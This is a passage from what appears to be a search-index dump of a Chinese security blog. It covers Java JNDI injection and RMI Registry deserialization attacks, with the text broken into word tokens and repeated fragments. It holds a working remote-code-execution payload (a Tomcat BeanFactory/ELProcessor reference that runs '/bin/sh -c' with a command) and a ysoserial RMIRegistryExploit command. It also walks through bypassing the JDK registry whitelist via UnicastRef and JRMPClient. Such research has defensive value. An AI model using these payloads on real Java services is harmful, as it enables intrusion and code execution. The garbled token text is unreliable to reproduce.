= eval   , \u6700\u7ec8 \u6211\u4eec \u5c06 \u5f97\u5230 eval \u7684 Method \u5bf9\u8c61   Enumeration   <   RefAddr   >   e   =   ref   .   getAll   ( ) ;   while   (   e   .   hasMoreElements   ( ) )   {   ra   =   e   .   nextElement   ( ) ;   String   propName   =   ra   .   getType   ( ) ;   if   (   propName   .   equals   (   Constants   .   FACTORY   )   | |   propName   .   equals   (   \" scope \"   )   | |   propName   .   equals   (   \" auth \"   )   | |   propName   .   equals   (   \" forceString \"   )   | |   propName   .   equals   (   \" singleton \"   ) )   {   continue   ;   }   value   =   (   String   )   ra   .   getContent   ( ) ;   Object   [ ]   valueArray   =   new   Object   [   1   ]   ;   / *   Shortcut   for   properties   with   explicitly   configured   setter   * /   Method   method   =   forced   .   get   (   propName   ) ;   if   (   method   ! =   null   )   {   valueArray   [   0   ]   =   value   ;   try   {   method   .   invoke   (   bean   ,   valueArray   ) ;   }   catch   (   IllegalAccessException   |   IllegalArgumentException   |   InvocationTargetException   ex   )   {   throw   new   NamingException   (   \" Forced   String   setter   \"   +   method   .   getName   ( )   +   \"   threw   exception   for   property   \"   +   propName   ) ;   }   continue   ;   }   ref . getAll   \u83b7\u53d6 \u4e86 \u6240\u6709 \u7684 RefAddr \uff0c \u5bf9\u4e8e \u975e   Constants . FACTORY / scope / auth / forceString / singleton   \u4e14 \u524d\u6587 \u53c8 \u83b7\u53d6 \u76f8\u5e94 \u7684 Method \u5bf9\u8c61 \u65f6 \uff0c \u6211\u4eec \u5c06 \u8c03\u7528 \u8be5 \u5bf9\u8c61 \uff0c \u5176 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e3a \u6b64\u65f6 RefAddr \u7684 \u5185\u5bb9 \u3002 \u6bd4\u5982 \u5b58\u5728 \u4e00\u4e2a RefAddr \u7684 type \u4e3a   test   \uff0c \u5c06 \u8c03\u7528 \u524d\u9762 \u7684   eval   \u7684 Method \u5bf9\u8c61 \u3002   \u5230 \u8fd9\u91cc \uff0c \u6211\u4eec \u5c31 \u5b8c\u6210 \u4e86 \u4e00\u6b21 \u53cd\u5c04 \u8c03\u7528 \uff0c \u6765 \u770b\u770b poc   / /   payload   from   kingx   ResourceRef   ref   =   new   ResourceRef   (   \" javax . el . ELProcessor \"   ,   / /   bean   class   null   ,   \" \"   ,   \" \"   ,   true   ,   \" org . apache . naming . factory . BeanFactory \"   ,   / /   factory   class   null   ) ;   ref   .   add   (   new   StringRefAddr   (   \" forceString \"   ,   \" KINGX = eval \"   ) ) ;   / /   eval \u51fd\u6570 Method \u5bf9\u8c61 \u5c06\u4f1a \u88ab \u8c03\u7528   ref   .   add   (   new   StringRefAddr   (   \" KINGX \"   ,   \" \\ \" \\ \" . getClass ( ) . forName ( \\ \" javax . script . ScriptEngineManager \\ \" ) \"   +   \" . newInstance ( ) . getEngineByName ( \\ \" JavaScript \\ \" ) \"   +   \" . eval ( \\ \" new   java . lang . ProcessBuilder [ ' ( java . lang . String [ ] ) ' ] ( \"   +   \" [ ' / bin / sh ' , ' - c ' , ' \"   +   command   +   \" ' ] ) \"   +   \" . start ( ) \\ \" ) \"   ) ) ;   / /   eval \u51fd\u6570 \u7684 \u53c2\u6570 \u4e3a \u4e0a\u8ff0 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u7684 el \u8bed\u53e5","title":"\u5229\u7528 \u53ef \u5229\u7528 \u7684 \u672c\u5730 Factory \u5bf9\u8c61"},{"location":"blog/2020/jndi-with-rmi-20200209/#0x05","text":"\u524d\u9762 \u5bf9 JNDI   with   RMI \u505a \u4e86 \u4e00\u4e9b \u7b80\u5355 \u7684 \u4ecb\u7ecd \uff0c \u5f53 \u9047\u5230 \u53ef\u63a7 \u7684 JNDI   lookup \u51fd\u6570 \uff0c \u6211\u4eec \u53ef\u4ee5 \u53d1\u8d77 JNDI \u94fe\u63a5 \u5230 RMI \u670d\u52a1 \u4e0a \uff0c \u5229\u7528 JNDI   Naming   Manager \u7684 \u8fdc\u7a0b codebase \u52a0\u8f7d \u673a\u5236 \u8f7d\u5165 \u4efb\u610f \u7684 bytecodes \u3002   \u5f53\u7136 \uff0c \u524d\u9762 \u7684 \u5229\u7528 \u65b9\u5f0f \u4ec5 \u5728 JDK8u113 \u3001 JDK6u132 , \u3001 JDK7u122 \u7248\u672c \u4e4b\u524d \uff0c \u5982\u679c \u9047\u5230 \u4e86 \u9ad8 \u7248\u672c \u7684 JDK \uff0c \u6211\u4eec \u53ef\u4ee5 \u5c1d\u8bd5 \u5229\u7528 \u672c\u5730 CLASSPATH \u4e2d \u53ef \u5229\u7528 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff0c \u6216\u8005 \u662f tomcat \u73af\u5883 \u4e0b \u7684 \u53ef \u5229\u7528 \u7684 ObjectFactory \u3002   \u5728 \u540e\u7eed \u53ef \u5229\u7528 \u7684 \u672c\u5730 Factory \u8fd9\u4e2a \u601d\u8def \u4e0a \uff0c \u539f\u6587 \u4f5c\u8005 kingx \u63d0\u51fa \u6216\u8bb8 \u5176\u4ed6 \u7684 \u4e2d\u95f4 \u4e2d\u95f4\u4ef6 \u73af\u5883 \u4e5f \u53ef\u80fd \u5b58\u5728 \u8fd9\u79cd \u53ef \u5229\u7528 \u7684 ObjectFactory \uff0c \u8fd9\u91cc \u7acb\u4e2a flag \uff0c \u4ee5\u540e \u6709\u7a7a \u4e86 \u4e00\u5b9a \u8981 \u627e \u627e XD","title":"0x05   \u603b\u7ed3"},{"location":"blog/2020/rmi-registry-security-problem-20200206/","tags":["java"],"text":"0x00   \u524d\u8a00   \u672c\u6587 \u8bb2\u8ff0 \u4e86 Java   RMI   Registry \u76f8\u5173 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \uff0c \u4e3b\u8bb2 Registry \uff0c \u540e\u7eed \u8865\u5145 \u4e86 Client \u7aef \u548c Server \u7aef\u7684 \u5229\u7528   0x01   \u539f\u7406   Java   RMI \u6d41\u7a0b \u53ef \u53c2\u8003   1   \uff0c \u51fa \u95ee\u9898 \u7684 \u4f4d\u7f6e \u5728\u4e8e \uff1a   \u60c5\u666f \u4e00 \uff1a Registry   \u63a5\u6536 bind / rebind \u8bf7\u6c42   \u4ece Client \u63a5\u6536 \u5230 \u7684 bind \u6216 rebind \u7684   remote   obj   \uff0c \u5c06 \u7531   sun / rmi / registry / RegistryImpl _ Skel . java # dispatch   \u5904\u7406   \uff08 \u4e0b\u56fe \u4e3a JDK8u141 \u4e4b\u524d \u7684 \u7248\u672c \u7684 \u5b9e\u73b0 \uff09   \u53ef\u4ee5 \u770b\u5230 \u83b7\u53d6 \u5230 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u76f4\u63a5 \u8c03\u7528 \u4e86 readObject \u51fd\u6570 \uff0c \u5bfc\u81f4 \u4e86 \u5e38\u89c4 \u7684 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u89e6\u53d1 \u3002   \u8fd9\u91cc \u6211\u4eec \u53ea \u9700\u8981 \u5199 \u4e00\u4e2a bind \u6216 rebind \u7684 \u64cd\u4f5c \uff0c \u5373\u53ef \u653b\u51fb \u5230 RMI   Registry \u3002   \u6ce8\u610f \uff1a bind / rebind \u8bf7\u6c42 \u7684 \u9650\u5236   Registry \u5bf9\u4e8e bind / rebind \u7684 \u8bf7\u6c42 \uff0c \u4f1a \u53bb \u68c0\u67e5 \u8fd9\u4e2a \u8bf7\u6c42 \u662f\u5426 \u4e3a \u672c\u5730 \u8bf7\u6c42 \uff0c \u5bf9\u4e8e \u5916\u90e8 \u7684 \u8bf7\u6c42 \uff0c Registry \u4f1a \u62d2\u7edd \u8be5 \u8bf7\u6c42 \u3002   \u8fd9\u91cc \u601d\u8def \u662f \u6b63\u786e \u7684 \uff0c \u53ef\u4ee5 \u9632\u6b62 \u5916\u90e8 \u7684 \u6076\u610f \u7ed1\u5b9a \uff0c \u4f46\u662f \u4ed6 \u5728 \u5b9e\u73b0 \u4e0a \u5b58\u5728 \u95ee\u9898 \u3002   JDK   8u141 \u4e4b\u524d \uff0c \u9996\u5148 \u4f1a \u53bb \u63a5\u6536 \u4f20\u9001 \u8fc7\u6765 \u7684 \u5bf9\u8c61 \uff0c \u5e76 \u5c06 \u5176 \u8fdb\u884c   readObject   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5b9e\u9645 \u5224\u65ad \u662f\u5426 \u4e3a \u672c\u5730 \u8bf7\u6c42 \uff0c \u662f \u5728 put \u65b0 \u7684 \u7ed1\u5b9a \u5bf9\u8c61 \u4e4b\u524d \u8fdb\u884c \u7684 \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u5728 checkAccess \u4e4b\u524d \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5b8c\u6210 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \uff0c \u8be5 \u9650\u5236 \u5e76 \u6ca1\u6709 \u8d77\u5230 \u76f8\u5e94 \u7684 \u4f5c\u7528 \u3002   \u800c \u5728 JDK   8u141 \u7248\u672c \u4e4b\u540e \uff0c   sun / rmi / registry / RegistryImpl _ Skel . java # dispatch   \u8fd9\u91cc \u4f1a\u5148 \u53bb \u5224\u65ad \u662f\u5426 \u4e3a \u672c\u5730 \u7ed1\u5b9a \u8bf7\u6c42 \uff0c \u7136\u540e \u518d \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u6240\u4ee5 \u5982\u679c \u8981 \u4f7f\u7528 bind / rebind \u8bf7\u6c42 \u6765 \u8fdc\u7a0b \u653b\u51fb Registry \uff0c JDK \u7248\u672c \u5fc5\u987b \u5728 8u141 \u4e4b\u524d   \u60c5\u666f \u4e8c \uff1a Registry \u63a5\u6536 lookup \u8bf7\u6c42   \u7531\u4e8e bind / rebind \u8bf7\u6c42 \u5728 141 \u540e\u7eed \u7248\u672c \u5b58\u5728 \u9650\u5236 \uff0c \u6240\u4ee5 \u4e3a\u4e86 \u653b\u51fb Registry \u6211\u4eec \u5fc5\u987b \u627e \u5176\u4ed6 \u7684 \u65b9\u6cd5 \u3002   \u5728 RMI \u91cc \u5ba2\u6237 \u5ba2\u6237\u7aef \u5411 Registry \u53d1\u8d77 lookup \u8bf7\u6c42 \u662f \u4e0d \u9650\u5236 \u8bf7\u6c42 \u6e90 \u7684 \uff0c \u90a3\u4e48 lookup \u662f\u5426 \u53ef\u4ee5 \u88ab \u6211\u4eec \u5229\u7528 \u5462 \uff1f   \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff0c \u6765\u770b   sun . rmi . registry . RegistryImpl _ Skel # dispatch   \u5bf9\u4e8e lookup \u8bf7\u6c42 \u7684 \u5904\u7406   \u53ef\u4ee5 \u770b\u5230 \u5728 \u8fd9\u91cc \uff0c \u63a5\u6536 \u5230 lookup \u53d1\u9001 \u8fc7\u6765 \u7684 \u5185\u5bb9 \u65f6 \uff0c \u4e5f \u662f \u76f4\u63a5 \u5bf9 \u5176 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \u3002 \u4f46\u662f \u8fd9\u91cc \u5e76 \u6ca1\u6709 bind / rebind \u7684 \u8bf7\u6c42 \u6e90 \u9650\u5236 \uff0c \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 lookup \u53d1\u8d77 \u5bf9 141 \u7248\u672c \u4e4b\u540e \u7684 registry \u7684 \u653b\u51fb \u3002   \u6211\u4eec \u5728 \u6784\u9020 lookup \u51fd\u6570 \u8bf7\u6c42 \u65f6 \uff0c \u53ea \u9700 \u91cd\u65b0 \u5b9e\u73b0 \u4e00\u4e0b lookup \u51fd\u6570 \u7684 \u5b9e\u73b0 \u5c31 \u53ef\u4ee5 \u4e86 \uff08 \u8fd9\u91cc \u5c06 Naming . lookup \u548c RegistryImpl _ Stub . lookup \u8fdb\u884c \u4e86 \u5408\u5e76 \uff0c \u5e76 \u5c06 \u4f20\u9001 \u8fc7\u53bb \u7684 \u5185\u5bb9 \u6539\u6210 \u4e86 \u4efb\u610f \u7684 Object \u5bf9\u8c61 \uff09 \u3002   0x02   \u653b\u51fb Registry   jdk < 8u121   \u73af\u5883 \u4f7f\u7528 jdk8u111 \uff0c \u8be5 \u7248\u672c \u4e0b \u7684 RMI   Registry \u63a5\u6536 \u7684 remote   obj \u53ea\u8981 \u7ee7\u627f \u4e86 Remote \u7c7b \u5373\u53ef \uff08 \u539f\u7406 \u89c1   2   \uff09 \uff0c \u6ca1\u6709 \u5176\u4ed6 \u7684 \u9650\u5236 \u3002   ysoserial \u5de5\u5177 \u4e2d \u7684   ysoserial . exploit . RMIRegisterExploit   \u91c7\u7528 \u4e86 \u4ee3\u7406 Remote \u7c7b \u7684 \u65b9\u5f0f \u6765 \u89e3\u51b3 \u8fd9\u4e2a \u9650\u5236 \u3002   \u4f7f\u7528 \u5982\u4e0b \u547d\u4ee4 \u5373\u53ef   java   - cp   ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRegistryExploit   RMIRegisterHost   RMIRegisterPort   CommonsCollections7   \" open   / System / Applications / Calculator . app \"   \u7b80\u5355 \u770b \u4e00\u4e0b ysoserial . exploit . RMIRegisterExploit \u7684 \u539f\u7406   \u6839\u636e \u524d\u9762 \u6587\u7ae0 \u4e2d \u7684 \u539f\u7406 \uff0c \u6211\u4eec \u4f20 \u8fc7\u53bb \u7684 \u5bf9\u8c61 \u5fc5\u987b \u8981\u662f \u4e00\u4e2a \u7ee7\u627f \u4e86 java . rmi . Remote \u63a5\u53e3 \u7684 \u5bf9\u8c61 \u3002 \u8fd9\u91cc ysoserial \u5de5\u5177 \u5219 \u76f4\u63a5 \u5229\u7528 \u52a8\u6001 \u4ee3\u7406 \u7684 \u539f\u7406 \uff0c \u5bf9 Remote \u7c7b \u505a \u4ee3\u7406 \uff0c \u5176 \u5904\u7406 \u7684 handler \u7528 \u4e86 CommonsCollections \u4e2d \u5e38\u7528 \u7684 AnnotationInvocationHandler \u3002 \u4f46 \u5176 \u89e6\u53d1 \u70b9 \u53d8\u4e3a handler \u7684 memberValues \u5c5e\u6027 \u88ab \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6240 \u6267\u884c \u7684 \u5229\u7528 \u94fe \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u8fdc\u7a0b bind \u5bf9\u8c61 \u5c06 \u6784\u9020 \u597d \u7684 remote \u5bf9\u8c61 \u4f20 \u8fc7\u53bb \u5373\u53ef \uff0c \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a \u4ee3\u7801   0x03   \u653b\u51fb Registry   jdk < 8u232 _ b09   jdk8u121 \u4fee\u590d \u540e \u7684 \u7248\u672c \u91cc \uff0c \u5bf9 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u7c7b \u505a \u4e86 \u540d\u5355 \u767d\u540d\u5355 \u9650\u5236 \uff0c \u89c1   sun / rmi / registry / RegistryImpl . java # registryFilter   \u8fd9\u4e2a \u540d\u5355 \u767d\u540d\u5355 \u5305\u62ec \uff1a   if   (   String   .   class   = =   clazz   | |   java   .   lang   .   Number   .   class   .   isAssignableFrom   (   clazz   )   | |   Remote   .   class   .   isAssignableFrom   (   clazz   )   | |   java   .   lang   .   reflect   .   Proxy   .   class   .   isAssignableFrom   (   clazz   )   | |   UnicastRef   .   class   .   isAssignableFrom   (   clazz   )   | |   RMIClientSocketFactory   .   class   .   isAssignableFrom   (   clazz   )   | |   RMIServerSocketFactory   .   class   .   isAssignableFrom   (   clazz   )   | |   java   .   rmi   .   activation   .   ActivationID   .   class   .   isAssignableFrom   (   clazz   )   | |   java   .   rmi   .   server   .   UID   .   class   .   isAssignableFrom   (   clazz   ) )   {   return   ObjectInputFilter   .   Status   .   ALLOWED   ;   }   else   {   return   ObjectInputFilter   .   Status   .   REJECTED   ;   }   0x02 \u4e2d \u53d1\u9001 \u7684 \u5bf9\u8c61 \u662f \u4ee3\u7406 \u540e \u7684 AnnotationInvocationHandler \u5bf9\u8c61 \uff0c \u5e76 \u4e0d \u5728 \u4e0a\u8ff0 \u5141\u8bb8 \u7684 \u7c7b \u91cc\u9762 \uff0c \u8fd9 \u5bfc\u81f4 \u539f\u5148 ysoserial \u5de5\u5177 \u4e2d \u7684 ysoserial . exploit . RMIRegisterExploit \u65e0\u6cd5 \u5229\u7528 \u3002 \u8fd9\u91cc \u6211\u4eec \u53c2\u8003   3   \u7684 \u65b9\u6cd5 \u6765 \u8fbe\u6210 \u5229\u7528 \u3002   \u9996\u5148 \u601d\u8def \u6bd4\u8f83 \u660e\u786e \u7684 \u662f \uff0c \u5982\u679c \u8981 \u7ed5\u8fc7 \u8fd9\u4e2a \u9650\u5236 \uff0c \u6211\u4eec \u9700\u8981 \u5728 \u4e0a\u8ff0 \u7684 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u627e\u5230 \u53ef\u4ee5 \u5229\u7528 \u7684 \u5bf9\u8c61 \u3002   \u5728 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u6211\u4eec \u6ce8\u610f \u4e00\u4e0b \u4e24\u4e2a \u7279\u6b8a \u5bf9\u8c61 Remote \u5bf9\u8c61 \u548c UnicastRef \u5bf9\u8c61   1 .   UnicastRef \u5bf9\u8c61   \u6211\u4eec \u90fd \u77e5\u9053 RMI \u8fc7\u7a0b \u4e2d \u5b58\u5728 \u5ba2\u6237 \u5ba2\u6237\u7aef \u4e0e \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u670d\u52a1\u5668\u7aef \u4e4b\u95f4 \u7684 \u4ea4\u4e92 \uff0c \u90a3\u4e48 \u5728 \u4ee3\u7801 \u5c42\u9762 \uff0c \u6211\u4eec \u9700\u8981 \u600e\u4e48 \u53bb \u521b\u9020 \u8fd9\u6837 \u4e00\u4e2a \u94fe\u63a5 \u5462 \uff1f   \u7531\u4e8e \u6f0f\u6d1e \u53d1\u751f \u70b9\u4e3a \u5411 \u8fdc\u7a0b \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u6ce8\u518c \u5bf9\u8c61 \u7684 \u5f15\u7528 \u3002 \u56de\u987e \u4e00\u4e0b \uff0c \u6211\u4eec \u5728 bind \u65f6 \uff0c \u4f1a\u5148 \u53bb \u83b7\u5f97 \u4e00\u4e2a Registry \uff0c \u7c7b\u4f3c \u4e0b\u9762   Registry   registry   =   LocateRegistry   .   getRegistry   (   \" 192.168 . 98.80 \"   ) ;   \u8ddf\u8fdb   java / rmi / registry / LocateRegistry . java # getRegistry   \u6ce8\u610f \u5230 \u8fd9\u6837 \u4e00\u6bb5 \u4ee3\u7801 \uff0c \u901a\u8fc7 TCPEndpoint \u6ce8\u518c \u670d\u52a1 \u670d\u52a1\u7aef \u7684 host \u3001 \u7aef\u53e3 \u7b49 \u4fe1\u606f \uff0c \u4ee5 UnicastRef \u5c01\u88c5 liveRef . \u5728 \u4e0b\u9762 createProxy \u65f6 \u4f7f\u7528 \u4e86 RemoteObjectInvocationHandler \u4f5c\u4e3a UnicastRef \u52a8\u6001 \u4ee3\u7406 \u7684 \u5904\u7406 \u7c7b   \u6700\u7ec8 \uff0c \u6211\u4eec \u5c06 \u4ee5 \u5ba2\u6237 \u5ba2\u6237\u7aef \u7684 \u8eab\u4efd \u53bb \u94fe\u63a5 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7684 Registry \u4f1a \u662f   sun / rmi / registry / RegistryImpl _ Stub . java # bind   \u5411 \u8fdc\u7a0b RMI   Registry \u6ce8\u518c \u3002   newCall \u53d1\u8d77 \u8fde\u63a5 \uff0c \u5e76 \u5c06 \u9700\u8981 \u7ed1\u5b9a \u7684 \u5bf9\u8c61 \u53d1\u9001 \u8fc7\u53bb \u3002   \u5230 \u8fd9\u91cc \u5c31 \u7ed3\u675f \u4e86 \u5411 \u8fdc\u7a0b Registry \u53d1\u8d77 \u7ed1\u5b9a \u7684 \u64cd\u4f5c \u3002 \u8fd9\u4e2a \u8fc7\u7a0b \u4e2d \u6211\u4eec \u7528\u5230 \u4e86 UnicastRef \u5bf9\u8c61 \uff0c \u90a3\u4e48 \u8fd9\u91cc \u60f3\u8c61 \u4e00\u4e0b \uff0c \u5982\u679c \u6211\u4eec \u53ef\u4ee5 \u63a7\u5236 UnicastRef \u5bf9\u8c61 \u91cc LiveRef \u7684 host \u548c port \uff0c \u90a3\u4e48 \u6211\u4eec \u5c31 \u80fd \u53d1\u8d77 \u4efb\u610f \u7684 RMI \u8fde\u63a5 \u3002 \u8fd9\u91cc \u5c31\u662f ysoserial \u4e2d JRMPClient \u7684 \u539f\u7406 \uff0c \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a payload   \u4e0d\u662f \u662f\u4e0d\u662f \u5f88 \u719f\u6089 XD \uff0c \u4f7f\u7528 \u7684 \u65b9\u6cd5 \u5c31\u662f \u524d\u9762 \u7ed1\u5b9a \u8fc7\u7a0b \u4e2d \u7684 \u4ee3\u7801 \u3002 \u800c \u5728 \u540d\u5355 \u767d\u540d\u5355 \u91cc UnicastRef \u5bf9\u8c61 \u662f \u5141\u8bb8 \u88ab \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u3002   2 .   RemoteObjectInvocationHandler \u5bf9\u8c61   \u524d\u9762 \u5206\u6790 \u5230 UnicastRef \u53ef \u88ab \u7528\u4e8e \u53d1\u8d77 RMI \u8fde\u63a5 \uff0c \u4f46\u662f \u4e3a\u4e86 \u7b26\u5408 \u53d1\u9001 \u7684 \u6761\u4ef6 \uff0c \u4ecd\u7136 \u9700\u8981 \u6ee1\u8db3 \u5b9e\u73b0 Remote \u63a5\u53e3 \u7684 \u6761\u4ef6 \u3002 \u800c UnicastRef \u5e76 \u6ca1\u6709 \u5b9e\u73b0 Remote \u63a5\u53e3 \uff0c \u8fd9 \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u76f4\u63a5 \u4f20 UnicastRef \u662f \u4e0d\u884c \u7684 \uff0c \u6211\u4eec \u8fd8 \u9700\u8981 \u518d \u591a \u505a \u4e00\u6b65 \uff0c \u8fd9\u91cc \u6709 \u4e24\u79cd \u65b9\u6cd5 \uff1a   \u8ddf RMIRegisterExploit \u4e00\u6837 \uff0c \u4f7f\u7528 Proxy \u53cd\u5c04 \u6765 \u5b9e\u73b0 \uff0c \u5176 handler \u7ee7\u627f \u4e8e Remote \u5e76 \u5904\u7406 \u4e86 \u6784\u9020 \u597d \u7684 UnicastRef \uff0c \u8fd9\u91cc \u7528\u5230 \u7684 \u5c31\u662f RemoteObjectInvocationHandler   \u627e\u5230 \u4e00\u4e2a \u53ef\u4ee5 \u5c01\u88c5 UnicastRef \u7684 \u5bf9\u8c61 \uff0c \u5e76\u4e14 \u8be5 \u5bf9\u8c61 \u8fd8 \u5b9e\u73b0 \u4e86 Remote \u5bf9\u8c61   \u8fd9\u91cc JRMPClient \u4f7f\u7528 \u7684 RemoteObjectInvocationHandler \u5c31\u662f \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u65b9\u6cd5 \uff0c \u6211\u4eec \u5c06 AnnotationInvocationHandler \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 RemoteObjectInvocationHandler \u3002 \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6\u4f1a \u8c03\u7528 RemoteObjectInvocationHandler \u7684 \u7236\u7c7b RemoteObject \u7684 readObject \u51fd\u6570   \u8fd9\u91cc \u7684 ref \u5c31\u662f \u6211\u4eec \u4f20 \u8fdb\u53bb \u7684 UnicastRef \uff0c \u8c03\u7528 \u5176 readExternal \u51fd\u6570 \uff0c \u8fd9\u91cc \u4ecb\u7ecd \u4e00\u4e0b readExternal   Java \u9ed8\u8ba4 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u673a\u5236 \u975e\u5e38 \u7b80\u5355 \u975e\u5e38\u7b80\u5355 \uff0c \u800c\u4e14 \u5e8f\u5217 \u5e8f\u5217\u5316 \u540e \u7684 \u5bf9\u8c61 \u4e0d \u9700\u8981 \u518d\u6b21 \u8c03\u7528 \u6784\u9020 \u5668 \u91cd\u65b0 \u751f\u6210 \uff0c \u4f46\u662f \u5728 \u5b9e\u9645 \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f1a \u5e0c\u671b \u5bf9\u8c61 \u7684 \u67d0 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e0d \u9700\u8981 \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6216\u8005 \u6216\u8005\u8bf4 \u4e00\u4e2a \u5bf9\u8c61 \u88ab \u8fd8\u539f \u4e4b\u540e \uff0c \u5176 \u5185\u90e8 \u7684 \u67d0\u4e9b \u5b50 \u5bf9\u8c61 \u9700\u8981 \u91cd\u65b0 \u521b\u5efa \uff0c \u4ece\u800c \u4e0d\u5fc5 \u5c06 \u8be5\u5b50 \u5bf9\u8c61 \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u5728 \u8fd9\u4e9b \u60c5\u51b5 \u4e0b \uff0c \u6211\u4eec \u53ef\u4ee5 \u8003\u8651 \u5b9e\u73b0 Externalizable \u63a5\u53e3 \u4ece\u800c \u4ee3\u66ff Serializable \u63a5\u53e3 \u6765 \u5bf9 \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u8fdb\u884c \u63a7\u5236 \u3002   Externalizable \u63a5\u53e3 extends   Serializable \u63a5\u53e3 \uff0c \u800c\u4e14 \u5728 \u5176 \u57fa\u7840 \u4e0a \u589e\u52a0 \u4e86 \u4e24\u4e2a \u65b9\u6cd5 \uff1a writeExternal ( ) \u548c readExternal ( ) \u3002 \u8fd9 \u4e24\u4e2a \u65b9\u6cd5 \u4f1a \u5728 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fd8\u539f \u7684 \u8fc7\u7a0b \u4e2d \u88ab \u81ea\u52a8 \u8c03\u7528 \uff0c \u4ee5\u4fbf \u6267\u884c \u4e00\u4e9b \u7279\u6b8a \u7684 \u64cd\u4f5c \u3002   https : / / xz . aliyun . com / t / 5392   \u8fd9\u91cc \u7684 readExternal \u5c31\u662f \u91cd\u65b0 \u521b\u5efa \u4e00\u4e2a tcp \u8fde\u63a5   \u7ee7\u7eed \u5f80\u4e0b \u8ddf   \u91cd\u65b0 \u751f\u6210 \u4e00\u4e2a LiveRef \u5bf9\u8c61 \u540e \uff0c \u5c06 \u5b58\u50a8 \u5230 \u5f53\u524d \u7684 ConnectionInputStream \u4e0a \u3002 \u540e\u7eed \u8be5 stream \u4f1a \u7ee7\u7eed \u8c03\u7528 registerRefs \u51fd\u6570   \u6700\u7ec8 \u7531 DGCClient \u53d1\u8d77 \u8fde\u63a5 \uff0c \u4e0b\u56fe \u4e2d \u7684 loopup \u51fd\u6570   \u5230 \u8fd9\u91cc \u540e\u9762 \u5c31\u662f JRMPListener \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4e1c\u897f \u4e86 \uff0c \u8fd9\u91cc \u5728 \u6700\u540e \u8fdb\u884c \u5206\u6790 \u3002   3 .   RMIConnectionImpl _ Stub \u5bf9\u8c61   \u524d\u9762 \u63d0\u5230 \u4e86 \u4e24\u79cd \u601d\u8def \uff0c \u8fd8\u6709 \u4e00\u79cd \u5c31\u662f \u627e\u5230 \u4e00\u4e2a \u5b9e\u73b0 \u4e86 Remote \u63a5\u53e3 \u5e76\u4e14 \u5c01\u88c5 \u4e86 ref \u7684 \u5bf9\u8c61 \uff0c \u8fd9\u91cc RMIConnectionImpl _ Stub \u5bf9\u8c61 \u5c31\u662f   RemoteObjectInvocationHandler \u540e\u7eed \u7684 \u89e6\u53d1 \u4e3b\u8981 \u4f9d\u9760 RemoteObject \u5bf9\u8c61 \u7684 readObject \u51fd\u6570 \u7684 \u91cd\u65b0 \u586b\u5145 \uff0c \u800c RMIConnectionImpl _ Stub \u5bf9\u8c61 \u4e5f \u7ee7\u627f \u4e86 RemoteObject \u6240\u4ee5 \u540e\u9762 \u7684 \u4e00\u4e9b \u8c03\u7528 \u8fc7\u7a0b \u8ddf \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u5bf9\u8c61 \u4e00\u6837 \uff0c \u4e0d\u518d \u53d9\u8ff0 \u3002   \u5176\u5b9e \u987a\u7740 \u601d\u8def \u627e \u8fd8 \u80fd \u53d1\u73b0   DGCImpl _ Stub   \u3001   RMIServerImpl _ Stub   \u3001   RegistryImpl _ Stub   \u3001   ReferenceWrapper _ Stub   \u90fd \u53ef\u4ee5   20200616   \u66f4\u65b0 \u4e00\u4e2a \u5c0f trick   \u524d\u9762 2 \u7684 \u90e8\u5206 \u63d0\u5230 \u4e86 \u7531\u4e8e UnicastRef \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u8fd8\u539f \u7684 \u5185\u5bb9 ref \u4f1a \u88ab \u6ce8\u518c \u5230 \u5f53\u524d \u7684 ConnectionInputStream \u7684 incomingRefTable \uff0c \u5e76\u4e8e StreamRemoteCall \u7684 releaseInputStream \u65f6 \u8c03\u7528 \u53d1\u8d77 \u53cd\u5411 jrmp \u94fe\u63a5 \u3002   \u8fd9\u91cc \u7684 \u91cd\u70b9 \u5728\u4e8e UnicastRef 